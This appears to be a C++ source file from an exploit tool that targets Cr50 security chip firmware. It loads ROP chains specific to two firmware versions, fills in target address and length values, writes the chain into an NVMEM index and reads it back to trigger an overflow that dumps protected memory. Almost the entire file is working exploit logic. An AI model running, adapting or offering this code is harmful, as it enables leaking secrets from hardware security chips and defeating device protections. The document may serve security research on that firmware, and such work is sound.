#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fcntl.h>
#include <iostream>
#include <unistd.h>

#include "args.hh"
#include "nvmem.hh"


/* Import our ROP chains. */
#define THUMB_BIT 1
#define BIT(nr) (1UL << (nr))

// REGISTER DEFINTIONS
#define GC_WATCHDOG_BASE 0x40500000
#define GC_GLOBALSEC_BASE 0x40090000
#define GC_WATCHDOG_WDOGLOCK (GC_WATCHDOG_BASE + 0xc00)
#define GC_WATCHDOG_WDOGCONTROL (GC_WATCHDOG_BASE + 0x8)
#define GC_GLOBALSEC_ALERT_CONTROL (GC_GLOBALSEC_BASE + 0x405c)
#define GC_GLOBALSEC_HIDE_ROM (GC_GLOBALSEC_BASE + 0x40d0)

#define ADDRESS_LEAK_START_MAGIC 0x0add4e55
#define ADDRESS_LEAK_SIZE_MAGIC 0xb1750000

#include "rop.hh"
#include "rop-0-5-120.h"
#include "rop-0-5-153.h"




using namespace std;


uint8_t ropbuf[2048];

static void set_address_spaces(uint32_t *buf, uint32_t adr, uint32_t len)
{
	for (int i = 0; i < (len / sizeof(uint32_t)); ++i) {
		if (buf[i] == ADDRESS_LEAK_START_MAGIC)
			buf[i] = adr;
		if (buf[i] == ADDRESS_LEAK_SIZE_MAGIC)
			buf[i] = len;
	}
}

static const uint8_t *get_dataleak_chain(uint32_t adr, uint32_t len)
{
	std::string ver;

	if (!fbool("--version","-V")) {
		std::cerr << "Error: Missing expected parameter --version!" << std::endl;
		return nullptr;
	}

	ver = fval("--version","-v", 1);
	
	/* appleflyer's Cr50 version */
	if (ver == "0.5.120") {
		memcpy(ropbuf, main_ropchain_0_5_120, sizeof(main_ropchain_0_5_120));
		memcpy(&ropbuf[1024], init_ropchain_0_5_120, sizeof(init_ropchain_0_5_120));

		set_address_spaces((uint32_t *) &ropbuf[1024], adr, len);
		return ropbuf;
	}

	/* Hannah's and WTT's Cr50 version */
	if (ver == "0.5.153") {
		memcpy(ropbuf, main_ropchain_0_5_153, sizeof(main_ropchain_0_5_153));
		memcpy(&ropbuf[1024], init_ropchain_0_5_153, sizeof(init_ropchain_0_5_153));

		set_address_spaces((uint32_t *) &ropbuf[1024], adr, len);
		return ropbuf;
	}

	return nullptr;
}

int dump_memory_range(uint32_t addr, uint32_t len)
{
	if (!get_dataleak_chain(addr, len)) {
		std::cerr << "Error: Failed to get an ROP chain for the provided version." << std::endl;
		return -1;
	}

	nvmem_write(0x80000A, 0, ropbuf, 1024);
	nvmem_write(0x80000A, 1024, &ropbuf[1024], 1024);

	// Trigger the overflow, the ROP should return 1kB of requested data.
	nvmem_read(0x80000A, 0, 2048);

	return 0;
}